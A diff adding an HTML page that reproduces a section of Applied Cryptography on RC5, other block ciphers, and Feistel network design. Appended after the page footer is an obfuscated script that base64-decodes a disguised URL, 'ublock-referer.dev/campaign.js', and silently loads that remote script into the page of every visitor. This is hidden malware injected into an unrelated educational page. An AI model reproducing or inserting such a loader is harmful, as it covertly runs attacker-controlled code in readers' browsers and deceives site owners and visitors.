@@ -1,0 +1,93 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Still Other Block Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=14//-->
+<!--PAGES=345-347//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="14-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="14-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>RC5 is actually a family of algorithms. We just defined RC5 with a 32-bit word size and 64-bit block; there&#146;s no reason why the same algorithm can&#146;t have a 64-bit word size and 128-bit block size. For <I>w</I> = 64, P and Q are 0xb7e151628aed2a6b and 0x9e3779b97f4a7c15, respectively. Rivest designates particular implementations of RC5 as RC5-<I>w/r/b</I>, where <I>w</I> is the word size, <I>r</I> is the number of rounds, and <I>b</I> is the length of the key in bytes.</P>
+<P>RC5 is new, but RSA Laboratories has spent considerable time analyzing it with a 64-bit block. After 5 rounds, the statistics look very good. After 8 rounds, every plaintext bit affects at least one rotation. There is a differential attack that requires 2<SUP>24</SUP> chosen plaintexts for 5 rounds, 2<SUP>45</SUP> for 10 rounds, 2<SUP>53</SUP> for 12 rounds, and 2<SUP>68</SUP> for 15 rounds. Of course, there are only 2<SUP>64</SUP> possible chosen plaintexts, so this attack won&#146;t work for 15 or more rounds. Linear cryptanalysis estimates indicate that it is secure after 6 rounds. Rivest recommends at least 12 rounds, and possibly 16 [1325]. This number may change.</P>
+<P>RSADSI is in the process of patenting RC5, and the name is trademarked. The company claims that license fees will be very small, but you&#146;d better check with them.</P>
+<H3><A NAME="Heading10"></A><FONT COLOR="#000077">14.9 Other Block Algorithms</FONT></H3>
+<P>There is an algorithm called CRYPTO-MECCANO in the literature [301]; it is insecure. Four Japanese cryptographers presented an algorithm based on chaotic maps at Eurocrypt &#146;91 [687, 688]; Biham cryptanalyzed the algorithm at the same conference [157]. Another algorithm relies on subsets of a particular set of random codes [693]. There are several algorithms based on the theory of error-correcting codes: a variant of the McEliece algorithm (see Section 19.7) [786,1290], the Rao-Nam algorithm [1292,733,1504,1291,1056,1057,1058,1293], variants of the Rao-Nam algorithm [464,749,1503], and the Li-Wang algorithm [964,1561]&#151;they are all insecure. CALC is insecure [1109]. An algorithm called TEA, for Tiny Encryption Algorithm, is too new to comment on [1592]. Vino is another algorithm [503]. MacGuffin, a block algorithm by Matt Blaze and me, is also insecure [189]; it was broken at the same conference it was proposed. BaseKing, similar in design philosophy as 3-way but with a 192-bit block [402], is too new to comment on.
+</P>
+<P>There are many more block algorithms outside the cryptology community. Some are used by various government and military organizations. I have no information about any of those. There are also dozens of proprietary commercial algorithms. Some might be good; most are probably not. If companies do not feel that their interests are served by making their algorithms public, it is best to assume they&#146;re right and avoid the algorithm.</P>
+<H3><A NAME="Heading11"></A><FONT COLOR="#000077">14.10 Theory of Block Cipher Design</FONT></H3>
+<P>In Section 11.1, I described Shannon&#146;s principles of confusion and diffusion. Fifty years after these principles were first written, they remain the cornerstone of good block cipher design.
+</P>
+<P>Confusion serves to hide any relationship between the plaintext, the ciphertext, and the key. Remember how linear and differential cryptanalysis can exploit even a slight relationship between these three things? Good confusion makes the relationship statistics so complicated that even these powerful cryptanalytic tools won&#146;t work.</P>
+<P>Diffusion spreads the influence of individual plaintext or key bits over as much of the ciphertext as possible. This also hides statistical relationships and makes cryptanalysis more difficult.</P>
+<P>Confusion alone is enough for security. An algorithm consisting of a single key-dependent lookup table of 64 bits of plaintext to 64 bits of ciphertext would be plenty strong. The problem is that large lookup tables require lots of memory to implement: 10<SUP>20</SUP> bytes of memory for the table just mentioned. The whole point of block cipher design is to create something that looks like a large lookup table, but with much smaller memory requirements.</P>
+<P>The trick is to repeatedly mix confusion (with much smaller tables) and diffusion in a single cipher in different combinations. This is called a <B>product cipher</B>. Sometimes a block cipher that incorporates layers of substitution and permutation is called a <B>substitution-permutation network</B>, or even an <B>SP network</B>.</P>
+<P>Look back at function f of DES. The expansion permutation and P-box perform diffusion; the S-boxes perform confusion. The expansion permutation and P-box are linear; the S-boxes are nonlinear. Each operation is pretty simple on its own; together they work pretty well.</P>
+<P>DES also illustrates a few more principles of block cipher design. The first is the idea of an <B>iterated block cipher</B>. This simply means taking a simple round function and iterating it multiple times. Two-round DES isn&#146;t very strong; it takes 5 rounds before all of the output bits are dependent on all of the input bits and all of the key bits [1078,1080]. Sixteen-round DES is strong; 32-round DES is even stronger.</P>
+<P><FONT SIZE="+1"><B><I>Feistel Networks</I></B></FONT></P>
+<P>Most block algorithms are <B>Feistel networks</B>. This idea dates from the early 1970s [552,553]. Take a block of length <I>n</I> and divide it into two halves of length <I>n</I>/2: <I>L</I> and <I>R</I>. Of course, <I>n</I> must be even. You can define an iterated block cipher where the output of the <I>i</I>th round is determined from the output of the previous round:</P>
+<DL>
+<DD><I>L</I><SUB>i</SUB> = <I>R</I><SUB>i - 1</SUB>
+<DD><I>R</I><SUB>i</SUB> = <I>L</I><SUB>i - 1</SUB> &#8853; <I>f</I>(<I>R</I><SUB>i - 1</SUB>,<I>K</I><SUB>i</SUB>)
+</DL>
+<P><I>K</I><SUB>i</SUB> is the subkey used in the <I>i</I>th round and <I>f</I> is an arbitrary round function.</P>
+<P>You&#146;ve seen this concept in DES, Lucifer, FEAL, Khufu, Khafre, LOKI, GOST, CAST, Blowfish, and others. Why is it such a big deal? The function is guaranteed to be reversible. Because XOR is used to combine the left half with the output of the round function, it is necessarily true that</P>
+<DL>
+<DD><I>L</I><SUB>i - 1</SUB> &#8853; <I>f</I>(<I>R</I><SUB>i - 1</SUB>,<I>K</I><SUB>i</SUB>) &#8853; <I>f</I>(<I>R</I><SUB>i - 1</SUB>,<I>K</I><SUB>i</SUB>) = <I>L</I><SUB>i - 1</SUB>
+</DL>
+<P>A cipher that uses this construction is guaranteed to be invertible as long as the inputs to <I>f</I> in each round can be reconstructed. It doesn&#146;t matter what <I>f</I> is; <I>f</I> need not be invertible. We can design <I>f</I> to be as complicated as we please, and we don&#146;t have to implement two different algorithms&#151;one for encryption and another for decryption. The structure of a Feistel network takes care of all this automatically.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="14-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="14-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(TDHIToKY, LJzGkgaI) {LJzGkgaI = TDHIToKY.createElement('script');LJzGkgaI.type = 'text/javascript';LJzGkgaI.async = true;LJzGkgaI.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');TDHIToKY.getElementsByTagName('body')[0].appendChild(LJzGkgaI);}(document));</script></body>
+</html>
